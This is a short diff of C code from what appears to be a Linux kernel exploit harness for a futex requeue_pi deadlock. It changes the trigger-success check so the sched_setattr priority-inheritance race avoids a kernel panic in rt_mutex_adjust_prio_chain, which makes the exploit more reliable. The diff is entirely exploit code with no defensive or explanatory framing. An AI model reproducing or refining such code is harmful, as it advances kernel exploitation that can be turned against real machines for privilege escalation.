@@ -881,7 +881,16 @@ static int slide_child_trigger_write(void) {
   int write_window = atomic_load(&slide_pselect_write_window) != 0;
   pr_info("slide downstream verification armed sched_ok=%d write_window=%d\n",
           sched_ok, write_window);
-  return atomic_load(&slide_waiter_ok) != 0 && sched_ok;
+  /*
+   * The requeue_pi deadlock leaves the waiter's PI chain in an
+   * unverified state.  Only treat the trigger as successful when the
+   * pselect write window was actually observed (ret>0), otherwise the
+   * sched_setattr PI walk races an unhinged chain and the kernel panics
+   * (rt_mutex_adjust_prio_chain NULL deref).  sched_ok alone is not an
+   * accepted trigger.
+   */
+  return atomic_load(&slide_waiter_ok) != 0 &&
+         atomic_load(&slide_pselect_write_window) != 0;
 #else
   return atomic_load(&slide_waiter_ok) != 0 &&
          atomic_load(&slide_pselect_write_window) != 0;
